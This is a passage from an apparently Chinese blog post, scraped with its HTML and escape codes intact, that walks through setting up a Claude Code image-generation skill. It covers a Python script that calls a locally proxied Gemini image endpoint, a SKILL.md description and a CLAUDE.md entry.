choices=[\u0026#34;all\u0026#34;, \u0026#34;first\u0026#34;, \u0026#34;last\u0026#34;, \u0026#34;max_res\u0026#34;]) args = parser.parse_args() if not args.prompt: parser.print_help() sys.exit(1) prompt = \u0026#34; \u0026#34;.join(args.prompt) if args.mode == \u0026#34;sdk\u0026#34;: saved = _sdk_generate( prompt=prompt, output_dir=args.output_dir, aspect_ratio=args.aspect_ratio, resolution=args.resolution, input_image=args.input_image, output_name=args.output_name, mkdir=args.mkdir, select=args.select, ) else: saved = _http_generate( prompt=prompt, output_dir=args.output_dir, aspect_ratio=args.aspect_ratio, resolution=args.resolution, input_image=args.input_image, select=args.select, output_name=args.output_name, mkdir=args.mkdir, ) if saved: print(f\u0026#34;Generated {len(saved)} image(s):\u0026#34;) for f in saved: print(f\u0026#34; - {Path(f).resolve()}\u0026#34;) else: print(\u0026#34;No images were generated.\u0026#34;) sys.exit(1) if __name__ == \u0026#34;__main__\u0026#34;: main() 基本用法：\n# Python 3.10+ # google-genai 包（SDK 模式需要） # SDK 模式（默认） python ~/.claude/skills/image-generator-hybrid/scripts/generate.py \u0026#34;山间日落\u0026#34; -r 4K -a 16:9 # HTTP 模式 python ~/.claude/skills/image-generator-hybrid/scripts/generate.py \u0026#34;山间日落\u0026#34; --mode http -r 4K 使用示例：\n# 生成 4K 竖版图片 python ~/.claude/skills/image-generator-hybrid/scripts/generate.py \u0026#34;人像照片\u0026#34; -r 4K -a 9:16 # 以图生图 python ~/.claude/skills/image-generator-hybrid/scripts/generate.py \u0026#34;转换为赛博朋克风格\u0026#34; -i input.jpg # 仅保存最高分辨率 python ~/.claude/skills/image-generator-hybrid/scripts/generate.py \u0026#34;风景\u0026#34; --select max_res # 自定义输出位置 python ~/.claude/skills/image-generator-hybrid/scripts/generate.py \u0026#34;猫咪\u0026#34; -o ./images --mkdir --output-name cat 二、准备claude/skills目录结构 在 ~/.claude/新建skills/gen-image目录，在gen-image下建scripts目录，把python文件放进去\n三、准备SKILL.md文件 --- name: gen-image description: 同时支持 SDK 与 HTTP 两种方式生成图片，可按需切换保存策略。 allowed-tools: Bash(python:*) --- # Image Generator (Hybrid) Skill 一个脚本同时支持 SDK 与 HTTP 直连两种模式。 ## 配置 - **API 端点**: `http://127.0.0.1:8317/v1beta/models/gemini-3-pro-image-preview:generateContent` - **模型**: `gemini-3-pro-image-preview` - **API Key**: `key` 可通过环境变量覆盖默认配置： - `IMAGE_API_KEY`: API 密钥 - `IMAGE_MODEL`: 使用的模型名称 - `IMAGE_API_BASE_URL`: API 基础地址 ## 参数 - `--mode`: `sdk|http`（默认 `sdk`） - `-r/--resolution`: `1K|2K|4K` - `-a/--aspect-ratio`: `1:1|2:3|3:2|3:4|4:3|4:5|5:4|9:16|16:9|21:9` - `-i/--input-image`: 以图生图输入图片路径 - `--select`: `all|first|last|max_res` - `max_res` 会选择返回中“最大体积”的那张（通常是 4K） - `-o/--output-dir`: 输出目录（默认当前目录） - `--output-name`: 指定文件名（可选；若返回多张，自动追加 `_1/_2`） - `--mkdir`: 当输出目录不存在时创建（默认 false）；否则回退到当前目录 ## 使用 ```bash # SDK 模式（默认） python ~/.claude/skills/gen-image/scripts/generate.py \u0026#34;描述\u0026#34; -r 4K -a 16:9 # HTTP 模式（保存全部返回图片） python ~/.claude/skills/gen-image/scripts/generate.py \u0026#34;描述\u0026#34; --mode http -r 4K -a 1:1 --select all # 仅保存最大尺寸 python ~/.claude/skills/gen-image/scripts/generate.py \u0026#34;描述\u0026#34; --mode http -r 4K -a 1:1 --select max_res ``` 看明白了吧，这个markdown 描述了这个技能的情况，配置、参数、使用\n最厉害的是claude会根据这个markdown文件来自动调用这个脚本，自己匹配合适的参数，这才是最厉害的地方\n那每个SKILL都是一个md文件，给个模板：\n# 技能名称 简单说明这个技能是干嘛用的，一般在什么情况下会用到。 ## 什么时候用 - 场景1：比如要上线新版本时 - 场景2：比如遇到某个特定错误时 ## 具体步骤 1. 第一步要做什么（附上具体的命令） 2. 第二步... 3. 依次往下 ## 怎么确认成功了 做完之后，通过哪些方法可以验证操作是成功的。 ## 可能遇到的问题 - 问题1：如果遇到...，可以试试... - 问题2：有时候会...，这时候应该... 四、配置Claude 在CLAUDE.md中添加\n## 生图 生成图片 使用技能 ~/.claude/skills/gen-image 然后就可以在claude里面使用了\n生图，4K，1:1，随机内容，仅保留最大分辨率，输出在当前目录，文件名：001.png 五、发散思维 这个是用的gemini的模型，那改改程序，用前面文章提供的接口：\n魔搭、模力方舟、豆包免费文生图 就可以随便生图了\n","permalink":"https://rendoumi.com/posts/20251231-claude_skills/","summary":"\u003cp\u003e最近天天都在学习claude code，Skills == 工具箱（技能库）\u003c/p\u003e\n\u003cp\u003e我们可以把skills看成是一个个的小程序，这些程序有入口，有参数，有限制。\u003c/p\u003e\n\u003cp\u003e那通过一篇md文件，来引导claude来智能的传参调用你的程序，这样技能箱就越来越丰富。\u003c/p\u003e\n\u003ch4 id=\"一我们首先准备这个可执行-python-脚本\"\u003e一、我们首先准备这个可执行 python 脚本\u003c/h4\u003e\n\u003cp\u003e这个是通过CLIProxyAPI的反代，把antigravity的gemini3模型给抽出来，然后生图\u003c/p\u003e\n\u003cp\u003e看最下面，有一堆参数\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/usr/bin/env python3\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e# ============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Configuration - Edit these values before use\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 配置项 - 使用前请修改以下值\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAPI_BASE_URL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;http://127.0.0.1:8317\u0026#34;\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# API server address / API 服务器地址\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAPI_KEY\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;key\u0026#34;\u003c/span\u003e                          \u003cspan class=\"c1\"\u003e# Your API key / 你的 API 密钥\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eMODEL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;gemini-3-pro-image-preview\u0026#34;\u003c/span\u003e     \u003cspan class=\"c1\"\u003e# Model name / 模型名称\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport argparse\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport base64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport json\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport os\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efrom datetime import datetime\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efrom pathlib import Path\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efrom urllib import request\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efrom mimetypes import guess_type\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etry:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    from google import genai\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    from google.genai import types\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexcept ImportError:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003egenai\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e None\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003etypes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e None\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eVALID_ASPECT_RATIOS\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;1:1\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;2:3\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;3:2\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;3:4\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;4:3\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;4:5\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;5:4\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;9:16\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;16:9\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;21:9\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eVALID_RESOLUTIONS\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;1K\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;2K\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;4K\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef _resolve_output_dir\u003cspan class=\"o\"\u003e(\u003c/span\u003eoutput_dir: str, mkdir: bool\u003cspan class=\"o\"\u003e)\u003c/span\u003e -\u0026gt; str:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e os.path.isdir\u003cspan class=\"o\"\u003e(\u003c/span\u003eoutput_dir\u003cspan class=\"o\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e output_dir\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e mkdir:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        os.makedirs\u003cspan class=\"o\"\u003e(\u003c/span\u003eoutput_dir, \u003cspan class=\"nv\"\u003eexist_ok\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eTrue\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e output_dir\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Warning: Output directory not found: {output_dir}. Saving to current directory.\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;.\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef _build_filename\u003cspan class=\"o\"\u003e(\u003c/span\u003eoutput_name: str \u003cspan class=\"p\"\u003e|\u003c/span\u003e None, timestamp: str, index: int, default_ext: str\u003cspan class=\"o\"\u003e)\u003c/span\u003e -\u0026gt; str:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e output_name:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        root, \u003cspan class=\"nv\"\u003eext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e os.path.splitext\u003cspan class=\"o\"\u003e(\u003c/span\u003eoutput_name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e not ext:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003eext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e default_ext\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003esuffix\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e f\u003cspan class=\"s2\"\u003e\u0026#34;_{index}\u0026#34;\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e index \u0026gt; \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e f\u003cspan class=\"s2\"\u003e\u0026#34;{root}{suffix}{ext}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e f\u003cspan class=\"s2\"\u003e\u0026#34;generated_{timestamp}_{index}{default_ext}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef _load_image_inline\u003cspan class=\"o\"\u003e(\u003c/span\u003eimage_path: str\u003cspan class=\"o\"\u003e)\u003c/span\u003e -\u0026gt; dict:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    mime_type, \u003cspan class=\"nv\"\u003e_\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e guess_type\u003cspan class=\"o\"\u003e(\u003c/span\u003eimage_path\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e mime_type is None:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003emime_type\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;image/png\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Path\u003cspan class=\"o\"\u003e(\u003c/span\u003eimage_path\u003cspan class=\"o\"\u003e)\u003c/span\u003e.read_bytes\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;inlineData\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;mimeType\u0026#34;\u003c/span\u003e: mime_type, \u003cspan class=\"s2\"\u003e\u0026#34;data\u0026#34;\u003c/span\u003e: base64.b64encode\u003cspan class=\"o\"\u003e(\u003c/span\u003edata\u003cspan class=\"o\"\u003e)\u003c/span\u003e.decode\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ascii\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)}}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef _post_json\u003cspan class=\"o\"\u003e(\u003c/span\u003eurl: str, body: dict\u003cspan class=\"o\"\u003e)\u003c/span\u003e -\u0026gt; dict:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e json.dumps\u003cspan class=\"o\"\u003e(\u003c/span\u003ebody\u003cspan class=\"o\"\u003e)\u003c/span\u003e.encode\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;utf-8\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ereq\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e request.Request\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        url,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edata,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eheaders\u003c/span\u003e\u003cspan class=\"o\"\u003e={\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Content-Type\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;application/json\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;x-goog-api-key\u0026#34;\u003c/span\u003e: API_KEY\u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eresp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e request.urlopen\u003cspan class=\"o\"\u003e(\u003c/span\u003ereq\u003cspan class=\"o\"\u003e)\u003c/span\u003e.read\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e json.loads\u003cspan class=\"o\"\u003e(\u003c/span\u003eresp\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef _save_images\u003cspan class=\"o\"\u003e(\u003c/span\u003eparts, output_dir: str, \u003cspan class=\"k\"\u003eselect\u003c/span\u003e: str, output_name: str \u003cspan class=\"p\"\u003e|\u003c/span\u003e None, mkdir: bool\u003cspan class=\"o\"\u003e)\u003c/span\u003e -\u0026gt; list\u003cspan class=\"o\"\u003e[\u003c/span\u003estr\u003cspan class=\"o\"\u003e]\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eimgs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003ep\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;inlineData\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e p in parts \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;inlineData\u0026#34;\u003c/span\u003e in p\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e not imgs:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"k\"\u003eselect\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;first\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eimgs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e imgs\u003cspan class=\"o\"\u003e[\u003c/span\u003e:1\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelif\u003c/span\u003e \u003cspan class=\"k\"\u003eselect\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;last\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eimgs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e imgs\u003cspan class=\"o\"\u003e[\u003c/span\u003e-1:\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelif\u003c/span\u003e \u003cspan class=\"k\"\u003eselect\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;max_res\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eimgs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e imgs\u003cspan class=\"o\"\u003e[\u003c/span\u003e-1:\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ets\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e datetime.now\u003cspan class=\"o\"\u003e()\u003c/span\u003e.strftime\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%Y%m%d_%H%M%S\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eoutput_dir\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e _resolve_output_dir\u003cspan class=\"o\"\u003e(\u003c/span\u003eoutput_dir, mkdir\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003esaved\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e i, img in enumerate\u003cspan class=\"o\"\u003e(\u003c/span\u003eimgs\u003cspan class=\"o\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e base64.b64decode\u003cspan class=\"o\"\u003e(\u003c/span\u003eimg\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;data\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan 